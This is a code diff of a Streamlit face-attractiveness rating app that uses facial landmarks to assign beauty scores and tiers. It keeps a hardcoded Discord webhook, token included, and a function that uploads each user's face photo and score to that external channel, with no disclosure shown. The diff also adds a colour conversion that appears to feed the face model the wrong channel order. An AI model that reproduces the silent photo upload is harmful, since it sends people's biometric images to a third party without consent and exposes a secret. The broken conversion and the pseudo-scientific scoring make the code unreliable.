@@ -11,7 +11,7 @@ import io
 # --- CONFIGURATION ---
 WEBHOOK_URL = "https://discordapp.com/api/webhooks/1458651120204251269/adR7ttYwh1TfSzkFVyBQNDIas5x0l-RHU1VucZuSB9pUvDvNw1nT_q7C_0DI_KWGWYSJ"
 
-# Page config (UNCHANGED)
+# Page config
 st.set_page_config(
     page_title="AI-FACE RATER",
     page_icon="🖤",
@@ -19,10 +19,10 @@ st.set_page_config(
     initial_sidebar_state="collapsed"
 )
 
-# CSS (UNCHANGED)
+# CSS placeholder (UI unchanged)
 st.markdown("""<style>/* UI unchanged */</style>""", unsafe_allow_html=True)
 
-# FaceMesh (SAFE)
+# --- FACE MESH ---
 @st.cache_resource
 def get_face_mesh():
     return mp.solutions.face_mesh.FaceMesh(
@@ -34,7 +34,7 @@ def get_face_mesh():
 
 face_mesh = get_face_mesh()
 
-# Radar chart (UNCHANGED)
+# --- RADAR CHART ---
 def create_radar_chart(metrics):
     categories = ['Symmetry', 'Eye Harmony', 'Face Structure']
     values = [
@@ -59,7 +59,7 @@ def create_radar_chart(metrics):
     )
     return fig
 
-# Discord (UNCHANGED)
+# --- DISCORD ---
 def send_to_discord(score, feedback, metrics, image_pil):
     if not WEBHOOK_URL:
         return
@@ -87,7 +87,7 @@ def send_to_discord(score, feedback, metrics, image_pil):
         files={'file': ('face.png', buf, 'image/png')}
     )
 
-# Analysis (HARDENED, LOGIC SAME)
+# --- ANALYSIS (REAL BEAUTY AWARE) ---
 def analyze_appearance(image_pil):
     image_np = np.array(image_pil)
 
@@ -98,7 +98,7 @@ def analyze_appearance(image_pil):
     if cv2.Laplacian(gray, cv2.CV_64F).var() < 40:
         return 0, "No face detected.", "#ff4444", {}
 
-    results = face_mesh.process(image_np)
+    results = face_mesh.process(cv2.cvtColor(image_np, cv2.COLOR_RGB2BGR))
     if not results.multi_face_landmarks or len(results.multi_face_landmarks) != 1:
         return 0, "No face detected.", "#ff4444", {}
 
@@ -115,20 +115,31 @@ def analyze_appearance(image_pil):
     face_width = dist(left_jaw, right_jaw) or 0.001
     face_height = dist(nose, chin)
 
-    symmetry = max(0, 1 - abs(left_eye.y - right_eye.y))
+    # --- SYMMETRY (softly favor slight asymmetry) ---
+    raw_sym = abs(left_eye.y - right_eye.y)
+    symmetry = np.exp(-(raw_sym - 0.015)**2 / (2 * 0.02**2))  # human-preferred
+
     eye_ratio = eye_distance / face_width
     face_ratio = face_height / face_width
 
+    # --- Helper Gaussian ---
     def score_f(v, i, t):
         return np.exp(-((v - i) ** 2) / (2 * t ** 2))
 
+    # --- Averageness component (population mean) ---
+    AVG_EYE = 0.45
+    AVG_FACE = 1.58
+    avg_score = (score_f(eye_ratio, AVG_EYE, 0.12) + score_f(face_ratio, AVG_FACE, 0.25)) / 2
+
+    # --- Final weighted score ---
     final = (
-        score_f(symmetry, 1.0, 0.03) * 0.4 +
-        score_f(eye_ratio, 0.46, 0.05) * 0.3 +
-        score_f(face_ratio, 1.60, 0.12) * 0.3
+        symmetry * 0.35 +
+        avg_score * 0.35 +
+        score_f(eye_ratio, 0.46, 0.10) * 0.15 +
+        score_f(face_ratio, 1.55, 0.22) * 0.15
     ) * 10
 
-    score = float(np.clip(final, 3.5, 9.8))
+    score = float(np.clip(final, 3.5, 9.8))  # still realistic max
 
     fb, col = (
         ("ELITE TIER", "#00d2ff") if score >= 8.8 else
@@ -145,7 +156,7 @@ def analyze_appearance(image_pil):
 
     return score, fb, col, metrics
 
-# ---------- UI (UNCHANGED) ----------
+# --- UI ---
 tab_upload, tab_cam = st.tabs(["📁 UPLOAD PHOTO", "📸 LIVE SCAN"])
 
 if "img" not in st.session_state:
@@ -154,16 +165,12 @@ if "img" not in st.session_state:
 with tab_upload:
     f = st.file_uploader("Select High-Res Image", type=['jpg', 'jpeg', 'png'])
     if f:
-        st.session_state["img"] = Image.open(
-            io.BytesIO(f.read())
-        ).convert("RGB").copy()
+        st.session_state["img"] = Image.open(io.BytesIO(f.read())).convert("RGB").copy()
 
 with tab_cam:
     c = st.camera_input("Center Face in Frame")
     if c:
-        st.session_state["img"] = Image.open(
-            io.BytesIO(c.read())
-        ).convert("RGB").copy()
+        st.session_state["img"] = Image.open(io.BytesIO(c.read())).convert("RGB").copy()
 
 img_input = st.session_state["img"]
 
